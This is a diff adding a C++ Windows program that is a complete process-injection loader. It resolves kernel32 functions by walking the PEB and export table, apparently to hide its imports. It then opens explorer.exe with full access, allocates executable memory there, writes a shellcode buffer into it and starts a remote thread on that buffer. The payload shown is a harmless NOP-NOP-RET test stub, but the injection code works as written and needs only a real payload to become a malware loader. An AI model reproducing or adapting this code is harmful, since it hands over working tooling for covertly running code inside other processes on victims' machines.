@@ -1,0 +1,154 @@
+#define _CRT_SECURE_NO_WARNINGS
+#include <windows.h>
+#include <stdio.h>
+#include <iostream>
+#include <Psapi.h>
+
+#pragma comment(lib, "Psapi.lib")
+
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, * PUNICODE_STRING;
+
+typedef struct _LDR_DATA_TABLE_ENTRY {
+    LIST_ENTRY InLoadOrderLinks;
+    LIST_ENTRY InMemoryOrderLinks;
+    LIST_ENTRY InInitializationOrderLinks;
+    PVOID      DllBase;
+    PVOID      EntryPoint;
+    ULONG      SizeOfImage;
+    UNICODE_STRING FullDllName;
+    UNICODE_STRING BaseDllName;
+    ULONG      Flags;
+    USHORT     LoadCount;
+    USHORT     TlsIndex;
+    LIST_ENTRY HashLinks;
+    PVOID      SectionPointer;
+    ULONG      CheckSum;
+    ULONG      TimeDateStamp;
+    PVOID      LoadedImports;
+    PVOID      EntryPointActivationContext;
+    PVOID      PatchInformation;
+} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;
+
+typedef struct _PEB_LDR_DATA {
+    ULONG Length;
+    BOOLEAN Initialized;
+    HANDLE SsHandle;
+    LIST_ENTRY InLoadOrderModuleList;
+    LIST_ENTRY InMemoryOrderModuleList;
+    LIST_ENTRY InInitializationOrderModuleList;
+} PEB_LDR_DATA, * PPEB_LDR_DATA;
+
+typedef struct _PEB {
+    BOOLEAN InheritedAddressSpace;
+    BOOLEAN ReadImageFileExecOptions;
+    BOOLEAN BeingDebugged;
+    BOOLEAN Spare;
+    HANDLE Mutant;
+    PVOID ImageBaseAddress;
+    PPEB_LDR_DATA Ldr;
+} PEB, * PPEB;
+
+typedef FARPROC(WINAPI* GETPROCADDRESS)(HMODULE, LPCSTR);
+typedef HMODULE(WINAPI* LOADLIBRARYA)(LPCSTR);
+typedef LPVOID(WINAPI* VAExType)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
+typedef BOOL(WINAPI* WPMType)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
+typedef HANDLE(WINAPI* CRTType)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
+
+PPEB GetPEB() {
+#ifdef _M_X64
+    return (PPEB)__readgsqword(0x60);
+#else
+    return (PPEB)__readfsdword(0x30);
+#endif
+}
+
+DWORD GetProcessIdByName(const std::wstring& processName) {
+    DWORD processIds[1024], bytesReturned;
+    if (!EnumProcesses(processIds, sizeof(processIds), &bytesReturned)) return 0;
+    DWORD processCount = bytesReturned / sizeof(DWORD);
+
+    for (DWORD i = 0; i < processCount; ++i) {
+        if (processIds[i] == 0) continue;
+        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processIds[i]);
+        if (hProcess) {
+            WCHAR processNameBuffer[MAX_PATH];
+            if (GetModuleBaseName(hProcess, NULL, processNameBuffer, MAX_PATH)) {
+                if (_wcsicmp(processNameBuffer, processName.c_str()) == 0) {
+                    CloseHandle(hProcess);
+                    return processIds[i];
+                }
+            }
+            CloseHandle(hProcess);
+        }
+    }
+    return 0;
+}
+
+PVOID GetProcAddressKernel32(HMODULE hModule, LPCSTR lpProcName) {
+    auto dos = (PIMAGE_DOS_HEADER)hModule;
+    auto nt = (PIMAGE_NT_HEADERS64)((BYTE*)hModule + dos->e_lfanew);
+    auto exportDirRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+    auto exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + exportDirRVA);
+    DWORD* funcNames = (DWORD*)((BYTE*)hModule + exportDir->AddressOfNames);
+    WORD* nameOrds = (WORD*)((BYTE*)hModule + exportDir->AddressOfNameOrdinals);
+    DWORD* funcs = (DWORD*)((BYTE*)hModule + exportDir->AddressOfFunctions);
+
+    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
+        char* name = (char*)hModule + funcNames[i];
+        if (strcmp(name, lpProcName) == 0) {
+            return (PVOID)((BYTE*)hModule + funcs[nameOrds[i]]);
+        }
+    }
+    return NULL;
+}
+
+int main() {
+    unsigned char shellcode[] = { 0x90, 0x90, 0xC3 }; // NOP NOP RET for test
+    unsigned int shellcodeSize = sizeof(shellcode);
+
+    PPEB peb = GetPEB();
+    HMODULE k32 = NULL;
+    PLIST_ENTRY head = &peb->Ldr->InLoadOrderModuleList;
+    PLIST_ENTRY curr = head->Flink;
+
+    while (curr != head) {
+        PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(curr, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
+        WCHAR baseName[MAX_PATH];
+        wcsncpy_s(baseName, entry->BaseDllName.Buffer, entry->BaseDllName.Length / sizeof(WCHAR));
+        baseName[entry->BaseDllName.Length / sizeof(WCHAR)] = L'\0';
+
+        if (_wcsicmp(baseName, L"KERNEL32.DLL") == 0) {
+            k32 = (HMODULE)entry->DllBase;
+            break;
+        }
+        curr = curr->Flink;
+    }
+
+    if (!k32) return -1;
+
+    std::wstring targetProc = L"explorer.exe";
+    DWORD pid = GetProcessIdByName(targetProc);
+    if (!pid) return -1;
+
+    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (!hProc) return -1;
+
+    GETPROCADDRESS getProc = (GETPROCADDRESS)GetProcAddressKernel32(k32, "GetProcAddress");
+    LOADLIBRARYA loadLib = (LOADLIBRARYA)GetProcAddressKernel32(k32, "LoadLibraryA");
+    HMODULE k32inProc = loadLib("kernel32.dll");
+    VAExType vaex = (VAExType)getProc(k32inProc, "VirtualAllocEx");
+    WPMType wpm = (WPMType)getProc(k32inProc, "WriteProcessMemory");
+    CRTType crt = (CRTType)getProc(k32inProc, "CreateRemoteThread");
+
+    LPVOID remoteAddr = vaex(hProc, NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    wpm(hProc, remoteAddr, shellcode, shellcodeSize, NULL);
+    HANDLE hThread = crt(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)remoteAddr, NULL, 0, NULL);
+
+    if (hThread) CloseHandle(hThread);
+    CloseHandle(hProc);
+    return 0;
+}
